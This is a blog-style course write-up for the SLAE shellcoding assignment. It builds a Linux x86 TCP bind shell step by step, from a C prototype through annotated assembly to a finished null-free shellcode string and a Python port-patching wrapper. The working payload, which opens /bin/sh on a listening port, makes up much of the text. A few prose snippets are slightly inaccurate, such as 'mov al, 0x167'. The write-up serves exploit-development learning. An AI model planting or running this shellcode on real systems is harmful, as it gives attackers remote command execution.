---
layout: single
title: SLAE Assignment 1 -- TCP Bind Shell
date: 2019-5-4
classes: wide
header:
  teaser: /assets/images/OSCP/pwk.png
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
--- 
![](/assets/images/OSCP/OSCP.png)

## Introduction

The first SLAE assignment is to develop shellcode for a bind TCP shell. What is a bind TCP shell? According to [Infosec Institute](https://resources.infosecinstitute.com/icmp-reverse-shell/#gref), a bind shell is "a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server."

I found that while not an easy subject, the actual assembly code construction was not very difficult. The learning curve from this assignment really came from trying to wrap my head around 'socket programming' fundamentals. The hardest part for me was trying to parse man page information about the various syscalls and trying to understand how to format the arguments required for each syscall. ***I am not a professional programmer, I apologize for any socket programming concepts I butchered in my explanations***

## Prototype

The first thing we want to do, in order to see the syscalls required to support the creation of a bind shell, is find the simplest implementation of a bind shell in a language higher than assembly. After a bit of googling, the simplest version of a bind shell in C that I could find is the following, with my comments added:

```c
#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {

    // This is our first syscall, the socket() call. 
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    // It looks like here we're building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = INADDR_ANY;  
    server_addr.sin_port = htons(5555);        

    // Our second syscall, and perhaps the most complicated: bind() 
    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // Our third syscall is listen()
    listen(listen_sock, 0);

    // Our fourth syscall is accept() 
    int conn_sock = accept(listen_sock, NULL, NULL);

    // Our fifth syscall, dup2(), is used 3 times
    dup2(conn_sock, 0);
    dup2(conn_sock, 1);
    dup2(conn_sock, 2);

    // Our final syscall is execve(), which runs a program fed to it as a string
    execve("/bin/sh", NULL, NULL);
}
```
Now that that's settled, it's become apparent we need to execute 6 syscalls in our assembly code:
+ socket
+ bind
+ listen
+ accept
+ dup2
+ execve

## Building Our Assembly Code

### Assembly Skeleton Code
```nasm
global_start

section .txt
_start:
```
The first thing we want to do is to clear out the registers we're going to use immediately. How do we know what registers we want to use? You can think of your syscall as something like an argv[0] in a command line program. So that's always going to correspond with the first register, EAX. Subsequent arguments will follow sequentially: argv[1] will correspond to EBX, argv[2] will correspond to ECX, etc.

If we consult `man 2 socket` for our first syscall, socket, we see that it takes 3 arguments in the following fashion:`int socket(int domain, int type, int protocol);`

So counting the syscall itself and its 3 arguments, we need to clear the first 4 registers so that we can work with those. Let's clear them by XOR'ing them with themselves so that we clear them in a way that does not introduct NULL BYTEs into our shellcode.

```nasm
global_start

section .txt
_start: 
  
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
```

## Socket Syscall

Let's now figure out what we're going to put into EAX to call socket. We can do this with a `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket` which tells us that the code for socket is 359. Popping 359 as decimal into a hex converter tells us that the hex equivalent is `0x167`, so let's place that in the low space of EAX so as to not introduce any NULL BYTEs with padding. 

```nasm
    mov al, 0x167
```

Now let's start with the arguments. `man 2 socket` tells us that the first argument is `int domain` which we see in the man page is `AF_INET` for IPv4. Let's just google 'value for AF_INET' and see what value we should use in the argument. Our first [result](http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html) is a university webpage which looks to be a header file explaining not only the value of `AF_INET` but also of `SOCK_STREAM` which is going to be our second value to satisfy the `int type` argument. According to the file, `AF_INET` is 2 and `SOCK_STREAM` is 1 (`0x02` and `0x01`) respectively. The last argument value for `int protocol` is going to be '0' according to the man page. So we need the following register and value combinations:
+ EBX == 0x02
+ ECX == 0x01
+ EDX == 0

Let's make these changes to our assembly code. If you remember, we already cleared EDX, so our zero value is already accounted for, so need to mess with that register at all. 

```nasm
    mov bl, 0x02
    mov cl, 0x01
```

Next we need to pass control to the [interrupt vector](https://stackoverflow.com/questions/1817577/what-does-int-0x80-mean-in-assembly-code) in order to handle our syscall (socket). 

```nasm
    int 0x80
```

Lastly, before moving on, we will need a way to identify this socket we've just created to subsequent systemcalls. We can do this by storing the value of EAX off to the side so that we can reference it later and still use EAX in our subsequent systemcalls. I chose to store this value in EDI as EDI is pretty far down our list of registers we'd fill arguments with, no idea if this makes sense, but it worked!

```nasm
    mov edi, eax
```

## Bind Syscall

Now we need to bind a 'name' to our newly created socket. First thing we want to do here is clear out EAX so that we can put the value of our bind call into the lower part of the register as we did above with socket. `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket` gives us a value of 361 which is `0x169`

Let's make these changes to our code

```nasm
    xor eax, eax
    mov al, 0x169
```

Now we need to consult `man 2 bind` to figure out the structure of the arguments this syscall requires. The result is `int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`

These arguments can be summarized at a high-level as follows: 
+ `int sockfd` -- this is a reference to the socket we just created, this is why we moved EAX into EDI 
+ `const struct sockaddr *addr` -- this is a pointer to the location on the stack of the sockaddr struct we are going to create
+ `socklen_t addrlen` -- this is the length of the address which the `/usr/include/linux/in.h` file tells us is 16

Let's start with satisfying the `int sockfd` argument. 

```nasm
    mov ebx, edi
```

Now, let's start creating our sockaddr struct on the stack. A [sockets programming tutorial](http://home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf) tells us that the sockaddr_in struct for the bind syscall consists of the following 4 components:
+ AF_INET
+ Port Number
+ Internet address
+ 0

Let's start moving these values into the registers. Our port number will be 5555 and our internet address will be 0.0.0.0

Because the stack grows from High to Low, we will have to place these arguments onto the stack in reverse order. We will also have to put our port number in Little Endian format, so instead of `0x15b3`, we will place `0xb315` onto the stack.

```nasm
    xor ecx, ecx
    push ecx
    push ecx
    push word 0xb315
    push word 0x02
```

Boom! Struct completed. Let's put the pointer to this entity into the ECX register so that we can satisfy our `const struct sockaddr *addr` argument. We'll also put 16 into the low part of the EDX register and call the interrupt again while we're here since that's easy enough. 

```nasm 
    mov ecx, esp
    mov dl, 16
    int 0x80
```

## Listen Syscall

Now we have to condition our bound socket to listen for incoming connections. `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep listen` nets us the code 363 for listen (`0x16b`). 

```nasm
    xor eax, eax
    mov ax, 0x16b
```

`man 2 listen` tells us that the argument structure for the syscall is `int listen(int sockfd, int backlog)`

`int sockfd` is again, just a reference to the socket we created that we took out of EAX and stored off to the side in EDI initially. From what I understand after reading about it, `int backlog` is just a reference to how many connections you want to queue if your socket is not immediately accepting connections. The way our code works, we want to immediately accept the first incoming connection, so this value can be 0 for us. With EBX and ECX figured out, we can now call interrupt and move on. 

```nasm
    mov ebx, edi
    xor ecx, ecx
    int 0x80
```

## Accept Syscall

We have our socket created, bound to an interface and port, and listening for connections. Next, we need to make it accept incoming connections. `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep accept` gives us the code for 'accept4()' which is 364 (`0x16c`).

```nasm
    xor eax, eax
    mov ax, 0x16c
```

`man 2 accept4` gives us an argument structure of `accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags)`

The mang page also states that the arguments after `int sockfd` (which we still have stored in EDI), can be given as NULL, NULL, 0 respectively. This is easy to pull off. So after we put EDI into EBX, we can just XOR the next 3 registers against themselves and call interrupt.

```nasm
    mov ebx, edi
    xor ecx, ecx
    xor edx, edx
    xor esi, esi
    int 0x80
```

If you read the accept4 man page carefully, the RETURN VALUE section states that after this syscall, we will receive a new `int sockfd` that we will need to use in subsequent syscalls. The original `int sockfd` was stored off to the side in EDI, so we'll do that with the new one as well. 

```nasm
    xor edi, edi
    mov edi, eax
```

## Dup2 Syscall 

If we reference our C prototype, we see that the dup2 call is iterating 3 times in order to duplicate into our accepted connection the STDIN (0), STDOUT (1), and STDERR (2) file descriptors which makes the connection interactive for the user. `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2` gives a syscall code of 63 (`0x3f`). 

Since we're iterating through this call 3 times, we'll need to set up a loop. We can utilize ECX for this as it's known as the 'counter register.' We'll place a value of 3 into the lower part of ECX and have our loop iterate as long as the zero flag is not set with a `jnz` op code. So as long as the zero flag is not set, which is to say that ECX hasn't been decremented to zero, our code will jump back up to the beginning of the loop and execute it again. 

All that dup2 requires for an argument is the `int sockfd` which was newly created in our accept syscall and stored in EDI. 

```nasm
    mov cl, 0x3     ; putting 3 in the counter
    loop_dup2:      
    xor eax, eax   
    mov al, 0x3f    ; putting the syscall code into the lower part of eax
    mov ebx, edi    ; putting our new int sockfd into ebx
    dec cl          ; decrementing cl by one
    int 0x80
    
    jnz loop_dup2   ; jumping back to the top of loop_dup2 if the zero flag is not set
```

## Execve Syscall

Finally, we need to tell the program what to do once everything we've done so far is complete. In our case, we want the program to execute `/bin/sh`. 

`cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve` gives us 11 (`0x0b`). 

Let's clear out EAX

```nasm
    xor eax, eax
```

We will be utilizng the stack for these arguments. So we will be doing things in slightly a different order than our previous syscalls. This particular syscall requires null terminators and pointers to stack locations. Remember the stack grows from High to Low so first we need to put a terminator onto the stack.

```nasm
    push eax
```

Next, we need to place the string `/bin/sh` onto the stack in reverse order. However, before we do this and in order to avoid NULL BYTEs in our shellcode, we need to make sure that the string is divisable by 4. Right now, it's 7 characters so we add an additional character to make it an even 8. `//bin/sh`

```nasm
    push 0x68732f6e
    push 0x69622f2f
```

Next, we need EBX to carry the pointer location of the entity we just created on the stack. 

```nasm
    mov ebx, esp
```

Next, we will need another zeroed out value to be pointed to for EDX, so let's push EAX onto the stack once more and then assign the ESP to EDX.

```nasm
    push eax
    mov edx, esp
```

Finally, ECX should point to the location of EBX. So we'll push EBX onto the stack and then move ESP into ECX. 

```nasm 
    push ebx
    mov ecx, esp
```

Now we can put our `0x0b` into the lower portion of EAX and call our interrupt. 

```nasm
    mov al, 0x0b
    int 0x80
```

## Completed Assembly Code 

```nasm
global_start

section .text
_start: 
	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; SYS CALL #1 = socket()
	
	mov ax, 0x167
	mov bl, 0x02
	mov cl, 0x01
	
	int 0x80
	mov edi, eax

	; SYS CALL #2 = bind()
	
	xor eax, eax
	mov ax, 0x169
	mov ebx, edi
	xor ecx, ecx
	push ecx
	push ecx
  	push word 0xb315
	push word 0x02

	mov ecx, esp
	mov dl, 16 
	
	int 0x80

	; SYSCALL #3= listen()

  	xor eax, eax
	mov ax, 0x16b
	mov ebx, edi
	xor ecx, ecx
	
	int 0x80

	; SYSCALL #4 = accept4()
	
	xor eax, eax
	mov ax, 0x16c
	mov ebx, edi
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
  
	int 0x80

	xor edi, edi
	mov edi, eax

	; SYSCALL #5 = dup2()
	
  	mov cl, 0x3
	
	loop_dup2:
	xor eax, eax ; clearing out eax
	mov al, 0x3f ; setting the value to the syscall code
	mov ebx, edi ; putting our new_fd we got from our accept return code
	dec cl       ; decrementing the counter register by 1
	int 0x80     ; interrupt call

	jnz loop_dup2 ; if the counter register hasn't hit zero and set the zero flag, it will jump back to the top of our loop

	; SYSCALL #6 = execve()
 
  	xor eax, eax
	push eax
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 0x0b

  	int 0x80
```

## Shellcode

To get our shellcode, we can run this nifty command `objdump -d ./<PROGRAM>|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'`

Our shellcode is: `\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

Looks to be null free!

## Python Wrapper

The next criteria we have to satisfy for the assignment, is to have the bind shell code created dynamically with user input for a port number. I have created a python wrapper to accomplish this. 

```python
#!/usr/bin/python

import socket
import sys

shell1 =  ""
shell1 += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01"
shell1 += "\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51"
shell1 += "\\x66\\x68"
shell2 = ""
shell2 += "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66"
shell2 += "\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89"
shell2 += "\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31"
shell2 += "\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e"
shell2 += "\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1"
shell2 += "\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) != 2:
	print 'Usage: wrapper.py <port>'
	exit
else:

	try:

		portNumber = sys.argv[1]
		portNumber = int(portNumber)
		portNumber = socket.htons(portNumber)
		portNumber = hex(portNumber)

		portNum1 = portNumber[2:4]
		portNum2 = portNumber[4:6]

		portNum1 = str(portNum1)
		portNum1 = "\\x" + portNum1

		portNum2 = str(portNum2)
		portNum2 = "\\x" + portNum2

		combined = portNum2 + portNum1

		shell = shell1 + combined + shell2

		print portNumber
		print portNum1
		print portNum2
		print combined
		print shell

	except:
	
		print "Oops, I\'m bad at python!" 
```



## Resources

https://stackoverflow.com/questions/1817577/what-does-int-0x80-mean-in-assembly-code
https://resources.infosecinstitute.com/icmp-reverse-shell/#gref
http://home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf
